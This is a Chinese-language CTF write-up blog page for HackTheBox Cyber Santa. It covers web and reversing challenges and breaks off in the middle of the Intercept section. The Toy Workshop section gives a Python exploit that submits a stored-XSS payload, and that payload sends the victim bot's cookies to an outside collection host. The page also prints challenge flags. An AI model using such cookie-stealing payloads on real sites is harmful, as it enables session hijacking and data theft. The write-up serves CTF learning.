<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/title_icon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/title_icon.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"ch3cke.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="HTB-Cyber Santa  文件链接：链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1XaA6j3LO0Pcp2pRfc8FyPg 提取码：jd48  WEB">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB_Cyber_Santa">
<meta property="og:url" content="https://ch3cke.github.io/2022/01/02/CTF/HTB-Cyber-Santa/index.html">
<meta property="og:site_name" content="ch3cke的小站">
<meta property="og:description" content="HTB-Cyber Santa  文件链接：链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1XaA6j3LO0Pcp2pRfc8FyPg 提取码：jd48  WEB">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/B6GP7YuqO24dzDj.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/X94JxWnys8ufG1N.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/6hJrKjzYSLyval7.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/CGqhfgkwnTAmEXi.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/QwvVnExlpkePtdX.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/pv6IeERXK1HwhiA.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/M2FDJKVZt1m4uWq.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/OfYWPuDArQTEyaw.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/Iuf7rgZR4kvwjOe.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/iLfTWZr6OqykJGx.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/46LoM1PqROcQkZz.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/I5YCuNrVlSbPyh2.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/tP6KvNXqRE1QCyn.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/l7YEnWxAKsrityO.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/3rJKN1pC6L4Tlhd.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/td9IyUcJYKhp8T4.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/SwDLYfBdExAH1rn.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/n82mUgNQtFfKHBP.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/d1zbyHoj9UMilh3.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/SRAvNJ6lzIj2WOg.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/nNyB7dm6qCl5VIo.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/5FzNDIYJOnLXw26.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/OqKibGdoATcDJak.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/TaktBiSX3rWOcVs.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/Zu7Cyj4J6BhNT8i.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/RCDJl3zIeZx94LP.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/PRaML2OVpd1hSJQ.png">
<meta property="og:image" content="https://s2.loli.net/2022/01/02/c3FmwaMt2V5sS7Y.png">
<meta property="article:published_time" content="2022-01-02T05:41:33.000Z">
<meta property="article:modified_time" content="2022-11-22T15:44:47.152Z">
<meta property="article:author" content="ch3cke">
<meta property="article:tag" content="HTB">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/01/02/B6GP7YuqO24dzDj.png">

<link rel="canonical" href="https://ch3cke.github.io/2022/01/02/CTF/HTB-Cyber-Santa/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>
<style>
    .pace .pace-progress {
        background: #1E92FB; /*进度条颜色*/
        height: 3px;
    }
    .pace .pace-progress-inner {
         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
    }
    .pace .pace-activity {
        border-top-color: #1E92FB;    /*上边框颜色*/
        border-left-color: #1E92FB;    /*左边框颜色*/
    }
</style>
  <title>HTB_Cyber_Santa | ch3cke的小站</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="ch3cke的小站" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ch3cke的小站</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">长夜将至，我从今日起开始守望</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">20</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">6</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">21</span></a>

  </li>
        <li class="menu-item menu-item-hot">

    <a href="/hot/" rel="section"><i class="fa fa-thermometer-half fa-fw"></i>hot</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/ch3cke" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://ch3cke.github.io/2022/01/02/CTF/HTB-Cyber-Santa/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ch3cke">
      <meta itemprop="description" content="万物皆虚，万事皆允">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ch3cke的小站">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HTB_Cyber_Santa
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-02 13:41:33" itemprop="dateCreated datePublished" datetime="2022-01-02T13:41:33+08:00">2022-01-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-22 23:44:47" itemprop="dateModified" datetime="2022-11-22T23:44:47+08:00">2022-11-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
            <span id="/2022/01/02/CTF/HTB-Cyber-Santa/" class="post-meta-item leancloud_visitors" data-flag-title="HTB_Cyber_Santa" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2022/01/02/CTF/HTB-Cyber-Santa/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2022/01/02/CTF/HTB-Cyber-Santa/" itemprop="commentCount"></span>
    </a>
  </span>
  
  <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>28k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>26 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1>HTB-Cyber Santa</h1>
<p><img src="https://s2.loli.net/2022/01/02/B6GP7YuqO24dzDj.png" alt="image"></p>
<p>文件链接：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1XaA6j3LO0Pcp2pRfc8FyPg">https://pan.baidu.com/s/1XaA6j3LO0Pcp2pRfc8FyPg</a><br>
提取码：jd48</p>
<p><img src="https://s2.loli.net/2022/01/02/X94JxWnys8ufG1N.png" alt="image-20220102204421845"></p>
<h2 id="WEB">WEB</h2>
<h3 id="Toy-Workshop">Toy Workshop</h3>
<p>题目源码:</p>
<p>核心源码：</p>
<p>bot.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> browser_options = &#123;</span><br><span class="line">	<span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">	<span class="attr">args</span>: [</span><br><span class="line">		<span class="string">&#x27;--no-sandbox&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--disable-background-networking&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--disable-default-apps&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--disable-extensions&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--disable-gpu&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--disable-sync&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--disable-translate&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--hide-scrollbars&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--metrics-recording-only&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--mute-audio&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--no-first-run&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--safebrowsing-disable-auto-update&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;--js-flags=--noexpose_wasm,--jitless&#x27;</span></span><br><span class="line">	]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cookies = [&#123;</span><br><span class="line">	<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span></span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">readQueries</span> = <span class="keyword">async</span> (<span class="params">db</span>) =&gt; &#123;</span><br><span class="line">		<span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(browser_options);</span><br><span class="line">		<span class="keyword">let</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>();</span><br><span class="line">		<span class="keyword">let</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>();</span><br><span class="line">		<span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:1337/&#x27;</span>);</span><br><span class="line">		<span class="keyword">await</span> page.<span class="title function_">setCookie</span>(...cookies);</span><br><span class="line">		<span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:1337/queries&#x27;</span>, &#123;</span><br><span class="line">			<span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle2&#x27;</span></span><br><span class="line">		&#125;);</span><br><span class="line">		<span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line">		<span class="keyword">await</span> db.<span class="title function_">migrate</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; readQueries &#125;;</span><br></pre></td></tr></table></figure>
<p>router/index.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express        = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router         = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> bot            = <span class="built_in">require</span>(<span class="string">&#x27;../bot&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> db;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">response</span> = data =&gt; (&#123; <span class="attr">message</span>: data &#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/submit&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">const</span> &#123; query &#125; = req.<span class="property">body</span>;</span><br><span class="line">		<span class="keyword">if</span>(query)&#123;</span><br><span class="line">			<span class="keyword">return</span> db.<span class="title function_">addQuery</span>(query)</span><br><span class="line">				.<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">					bot.<span class="title function_">readQueries</span>(db);</span><br><span class="line">					res.<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">&#x27;Your message is delivered successfully!&#x27;</span>));</span><br><span class="line">				&#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">&#x27;Please write your query first!&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/queries&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">ip</span> != <span class="string">&#x27;127.0.0.1&#x27;</span>) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> db.<span class="title function_">getQueries</span>()</span><br><span class="line">		.<span class="title function_">then</span>(<span class="function"><span class="params">queries</span> =&gt;</span> &#123;</span><br><span class="line">			res.<span class="title function_">render</span>(<span class="string">&#x27;queries&#x27;</span>, &#123; queries &#125;);</span><br><span class="line">		&#125;)</span><br><span class="line">		.<span class="title function_">catch</span>(<span class="function">() =&gt;</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">&#x27;Something went wrong!&#x27;</span>)));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function"><span class="params">database</span> =&gt;</span> &#123; </span><br><span class="line">	db = database;</span><br><span class="line">	<span class="keyword">return</span> router;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>XSS漏洞，利用在线的xss平台，直接打。exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://68.183.40.128:30700/api/submit&quot;</span></span><br><span class="line"></span><br><span class="line">payload = json.dumps(&#123;</span><br><span class="line">  <span class="string">&quot;query&quot;</span>: <span class="string">&quot;&lt;/p&gt;&lt;script&gt;document.location=&#x27;http://xsshs.cn/mjI1/xss.jpg?cookie=&#x27;+document.cookie;&lt;/script&gt;&lt;p&gt;&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line">headers = &#123;</span><br><span class="line">  <span class="string">&#x27;Proxy-Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://68.183.40.128:30700&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://68.183.40.128:30700/&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,ko;q=0.7&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;x-forwarded-for&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;x-originating-ip&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;x-remote-ip&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;x-remote-addr&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:10809&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload, proxies=proxies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="comment"># HTB&#123;3v1l_3lv3s_4r3_r1s1ng_up!&#125;</span></span><br></pre></td></tr></table></figure>
<p>攻击结果：</p>
<p><img src="https://s2.loli.net/2022/01/02/6hJrKjzYSLyval7.png" alt="image"></p>
<hr>
<h3 id="Toy-Management">Toy Management</h3>
<p>初步认定为jwt问题</p>
<hr>
<h2 id="REV">REV</h2>
<h3 id="Infiltration">Infiltration</h3>
<p>动态调试即可</p>
<p>flag：HTB{n0t_qu1t3_s0_0p4qu3}</p>
<hr>
<h3 id="Gift-Wrapping">Gift Wrapping</h3>
<p>upx 加壳，可以直接脱壳</p>
<p><img src="https://s2.loli.net/2022/01/02/CGqhfgkwnTAmEXi.png" alt="image"></p>
<p>加密逻辑：</p>
<p><img src="https://s2.loli.net/2022/01/02/QwvVnExlpkePtdX.png" alt="image"></p>
<p><img src="https://s2.loli.net/2022/01/02/pv6IeERXK1HwhiA.png" alt="image"></p>
<p><code> HTB&#123;upx_41nt_50_h4rd!!&#125;</code></p>
<hr>
<h3 id="Intercept">Intercept</h3>
<p>两个文件，一个是加密的流量和一个加密的脚本。asm加密脚本：</p>
<p>intercept.asm</p>
<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">	.text</span><br><span class="line">	.globl	state</span><br><span class="line">	.bss</span><br><span class="line">	.type	state, @object</span><br><span class="line">	.size	state, 1</span><br><span class="line">state:</span><br><span class="line">	.zero	1</span><br><span class="line">	.text</span><br><span class="line">	.globl	do_encrypt</span><br><span class="line">	.type	do_encrypt, @function</span><br><span class="line">do_encrypt:</span><br><span class="line">	push	rbp</span><br><span class="line">	mov	rbp, rsp</span><br><span class="line">	mov	eax, edi</span><br><span class="line">	mov	BYTE PTR [rbp-4], al</span><br><span class="line">	movzx	eax, BYTE PTR state[rip]</span><br><span class="line">	add	eax, 19</span><br><span class="line">	xor	BYTE PTR [rbp-4], al</span><br><span class="line">	movzx	eax, BYTE PTR state[rip]</span><br><span class="line">	add	eax, 55</span><br><span class="line">	mov	BYTE PTR state[rip], al</span><br><span class="line">	movzx	eax, BYTE PTR [rbp-4]</span><br><span class="line">	pop	rbp</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p>加密流量为：</p>
<p><img src="https://s2.loli.net/2022/01/02/M2FDJKVZt1m4uWq.png" alt="image"></p>
<p>逆向汇编代码，可得加密代码：</p>
